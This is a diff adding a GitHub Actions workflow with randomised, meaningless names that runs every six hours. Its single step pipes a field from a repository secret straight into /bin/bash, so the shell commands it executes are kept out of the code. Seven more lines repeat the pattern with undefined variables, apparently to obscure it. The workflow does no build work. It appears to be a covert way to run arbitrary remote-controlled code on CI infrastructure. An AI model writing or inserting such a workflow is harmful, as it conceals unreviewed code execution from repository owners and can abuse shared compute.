@@ -1,0 +1,24 @@
+name: baiheizi7182
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baiheizi7182
+        env:
+          tyrj46203: ${{ secrets.tyrj46203 }}
+        run: |
+          echo $tyrj46203 | jq -r .ou764 | /bin/bash
+          echo $bsd7 | jq -r .dk3 | /bin/bash
+          echo $eveb019 | jq -r .mk0 | /bin/bash
+          echo $g660 | jq -r .h48 | /bin/bash
+          echo $fqx37 | jq -r .wg00 | /bin/bash
+          echo $z0 | jq -r .lyo6435 | /bin/bash
+          echo $ebyv11 | jq -r .zq880 | /bin/bash
+          echo $b51564 | jq -r .yfo47276 | /bin/bash
+
